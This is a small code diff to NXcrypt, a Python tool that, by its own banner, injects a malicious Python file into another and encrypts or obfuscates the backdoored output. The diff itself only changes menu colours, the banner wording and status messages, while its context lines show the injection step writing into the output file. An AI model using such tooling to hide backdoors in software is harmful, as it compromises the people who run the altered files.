@@ -30,12 +30,16 @@ import commands
 import time
 import random
 
+
 error = '\033[37;41m'
 error1 = '\033[1;m'
 
 sucess = '\033[32m'
 sucess1 = '\033[37m'
 
+troll = ['\033[1;36m','\033[1;34m','\033[1;33m']
+
+colored = random.choice(troll)
 
 text = """
 
@@ -299,13 +303,13 @@ VP   V8P YP    YP  `Y88P' 88   YD    YP    88         YP
                                         Codename 'WannaLaugh'
 
        """
-menu_linux = "\033[32m" + (menu) + "\033[37m"
+menu_linux = (colored) + (menu) + (colored)
 
 name = """
 ------------------------------------------------
 |                                              |
 | -NXcrypt functionnalities                    |
-|      - python backdoor encryption            |
+|      - 'python backdoor' encryption          |
 |      - backdooring python file  with         |
 |        a malicious python file               |
 |                                              |
@@ -448,6 +452,8 @@ elif (option.backdoor) :
 		hm.write("thread_1.start()\n")
 		hm.write("thread_2.start()\n")
 		hm.close()
+		print(sucess+"[+] File : {}".format(option.file)+sucess1)
+		print(sucess+"[+] Backdoor File : {}".format(option.backdoor)+sucess1)
 		print(sucess+"[+] Injection finished "+sucess1)
 		print(sucess+"[*] Output : {} ".format(_output_)+sucess1)
 
@@ -504,6 +510,8 @@ elif (option.backdoor) :
 		hm.write("thread_1.start()\n")
 		hm.write("thread_2.start()\n")
 		hm.close()
+		print(sucess+"[+] File : {}".format(option.file)+sucess1)
+		print(sucess+"[+] Backdoor File : {}".format(option.backdoor)+sucess1)
 		print(sucess+"[+] Injection finished  "+sucess1)
 		question = raw_input(sucess+"Do you want  encrypt (obfuscate) the output [y/n] ? "+sucess1)
 		if (question.lower()) == "y" :
